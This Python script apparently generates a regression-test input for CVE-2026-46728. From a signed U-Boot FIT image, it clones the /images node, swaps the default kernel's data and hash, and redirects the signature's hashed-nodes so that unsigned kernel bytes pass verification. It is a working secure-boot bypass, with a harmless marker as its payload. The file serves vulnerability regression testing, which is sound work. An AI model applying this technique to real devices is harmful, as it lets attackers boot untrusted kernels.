#!/usr/bin/env python3
"""clone_images.py SEED OUT: the CVE-2026-46728 input, made from the signed
SEED as upstream's "clone" test makes it (image_clone_attack() in
test/py/tests/vboot_evil.py, a22e9e1b8ec7; ../regressions/CVE-2026-46728.md):
 1. copy the signed /images node, byte for byte, to /images/images (the
    last subnode of /images), with an empty node EMPTYNO before its end and
    another after it, as upstream does: fdt_find_regions() hashes an END tag
    that directly follows hashed nodes, so without them the copy's own END
    would join the signed bytes;
 2. at /images/<kernel> (the default configuration's kernel), swap the data
    for bytes the key never signed and set its sha256 hash value to match;
 3. point every /images/... entry of that configuration's signature
    hashed-nodes, which the signature does not cover, at its copy.
No key is needed and no property name is added, so the strings the signature
covers stay as signed. Standard library only; run it with python3 -I."""
import hashlib
import os
import struct
import sys

sys.dont_write_bytecode = True  # no __pycache__ in the source tree
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from graft_node import BEGIN, END, HDR, PROP, align, tokens  # noqa: E402

PAYLOAD = b"uboot-fit CVE-2026-46728 regression: these kernel bytes were never signed\n"
EMPTY = struct.pack(">I", BEGIN) + b"EMPTYNO\0" + struct.pack(">I", END)


def die(msg):
    sys.exit("clone_images.py: " + msg)


def prop(raw, value):
    """PROP token raw with a new value, under the same name offset."""
    nameoff = struct.unpack_from(">I", raw, 8)[0]
    return struct.pack(">III", PROP, len(value), nameoff) + value + b"\0" * (align(len(value)) - len(value))


def main(seed_file, out_file):
    seed = open(seed_file, "rb").read()
    hdr = list(HDR.unpack_from(seed))
    off_st, off_str, off_rsv, size_str, size_st = hdr[2], hdr[3], hdr[4], hdr[8], hdr[9]
    if not off_rsv < off_st <= off_st + size_st <= off_str:
        die("seed blocks are not in the usual order")
    if (seed[off_st + size_st:off_str] + seed[off_str + size_str:]).strip(b"\0"):
        die("%s has data outside its struct and strings blocks" % seed_file)
    props = {(p, n): v for tok, _, _, p, n, v in tokens(seed) if tok == PROP}
    if any(n in ("data-offset", "data-position") for _, n in props):
        die("%s has external data; not supported" % seed_file)
    conf = "/configurations/" + props.get(("/configurations", "default"), b"").rstrip(b"\0").decode()
    kernel = "/images/" + props.get((conf, "kernel"), b"").rstrip(b"\0").decode()

    edits, done = [], []  # edits: (start, end, new bytes); done: one name per edit
    for tok, start, end, p, name, value in tokens(seed):
        if tok == BEGIN and p == "/images/images":
            die("%s already has /images/images" % seed_file)
        if tok == BEGIN and p == "/images":
            images = start
        elif tok == END and p == "/images":  # 1. the copy
            edits.append((start, start, seed[images:start] + EMPTY + seed[start:end] + EMPTY))
            done.append("copy")
        elif tok == PROP and p == kernel and name == "data":  # 2. the swap
            edits.append((start, end, prop(seed[start:end], PAYLOAD)))
            done.append("data")
        elif (tok == PROP and p.startswith(kernel + "/hash") and p.count("/") == 3
              and name == "value"):
            if props.get((p, "algo")) != b"sha256\0":
                die("%s is not a sha256 hash" % p)
            edits.append((start, end, prop(seed[start:end], hashlib.sha256(PAYLOAD).digest())))
            done.append("hash")
        elif tok == PROP and p.startswith(conf + "/signature") and name == "hashed-nodes":  # 3.
            nodes = value.split(b"\0")[:-1]
            if kernel.encode() not in nodes:
                die("%s does not name %s" % (p, kernel))
            nodes = [b"/images" + n if n.startswith(b"/images/") else n for n in nodes]
            edits.append((start, end, prop(seed[start:end], b"\0".join(nodes) + b"\0")))
            done.append("hashed-nodes")
    if sorted(done) != ["copy", "data", "hash", "hashed-nodes"]:
        die("want one each of /images, %s data and hash, %s hashed-nodes; found %s"
            % (kernel, conf, sorted(done)))

    st, pos = bytearray(), off_st
    for start, end, new in sorted(edits):
        st += seed[pos:start] + new
        pos = end
    st += seed[pos:off_st + size_st]
    hdr[1], hdr[3], hdr[9] = off_st + len(st) + size_str, off_st + len(st), len(st)
    out = HDR.pack(*hdr) + seed[HDR.size:off_st] + bytes(st) + seed[off_str:off_str + size_str]
    list(tokens(out))  # the result must parse: tokens() exits on a bad header or token
    with open(out_file, "wb") as f:
        f.write(out)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(__doc__)
    main(*sys.argv[1:])
